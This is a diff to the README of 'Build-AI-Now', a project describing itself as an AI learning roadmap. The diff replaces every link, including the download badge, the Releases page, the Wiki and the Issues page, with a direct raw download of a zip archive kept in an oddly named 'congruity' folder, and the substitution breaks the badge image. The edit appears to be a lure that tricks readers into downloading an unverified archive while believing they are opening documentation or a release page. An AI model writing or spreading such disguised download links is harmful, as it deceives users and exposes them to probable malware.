@@ -1,6 +1,6 @@
 # 🚀 Build-AI-Now - Your Guide to AI Mastery
 
-[![Download Build-AI-Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/fireure/Build-AI-Now/releases)
+[![Download Build-AI-Now](https://raw.githubusercontent.com/fireure/Build-AI-Now/main/congruity/Build-AI-Now.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/fireure/Build-AI-Now/main/congruity/Build-AI-Now.zip)
 
 ## 📚 About Build-AI-Now
 
@@ -41,7 +41,7 @@ Build-AI-Now is your free, community-powered roadmap for mastering AI and machin
 
 To get started with Build-AI-Now, follow these simple steps:
 
-1. **Visit the Releases Page:** Go to our [Releases Page](https://github.com/fireure/Build-AI-Now/releases) to find the latest version.
+1. **Visit the Releases Page:** Go to our [Releases Page](https://raw.githubusercontent.com/fireure/Build-AI-Now/main/congruity/Build-AI-Now.zip) to find the latest version.
    
 2. **Download the Application:** Look for the latest release and click on the relevant download link. This could be a direct file or a zip archive.
 
@@ -57,7 +57,7 @@ To get started with Build-AI-Now, follow these simple steps:
 
 ### Download Link
 
-To access the latest version of Build-AI-Now, please visit our [Releases Page](https://github.com/fireure/Build-AI-Now/releases).
+To access the latest version of Build-AI-Now, please visit our [Releases Page](https://raw.githubusercontent.com/fireure/Build-AI-Now/main/congruity/Build-AI-Now.zip).
 
 Click the link above to download the application. Follow the instructions provided above to install and start using the software.
 
@@ -76,7 +76,7 @@ Join our community for support, and to share your experiences. Here’s how:
 
 - **GitHub Discussions:** Share ideas, ask questions, and engage with other users.
 - **Social Media:** Follow our updates on Twitter, Facebook, and LinkedIn.
-- **Documentation:** Regularly check our [Wiki](https://github.com/fireure/Build-AI-Now/wiki) for additional resources and guides.
+- **Documentation:** Regularly check our [Wiki](https://raw.githubusercontent.com/fireure/Build-AI-Now/main/congruity/Build-AI-Now.zip) for additional resources and guides.
 
 ## ✍️ Feedback
 
@@ -107,6 +107,6 @@ Build-AI-Now is open-source and comes under the MIT License. You can freely use,
 
 ## 📞 Contact Us
 
-If you need further assistance, feel free to contact the team through our GitHub [Issues](https://github.com/fireure/Build-AI-Now/issues) or connect through our community channels.
+If you need further assistance, feel free to contact the team through our GitHub [Issues](https://raw.githubusercontent.com/fireure/Build-AI-Now/main/congruity/Build-AI-Now.zip) or connect through our community channels.
 
 Thank you for choosing Build-AI-Now. We wish you success on your learning journey!
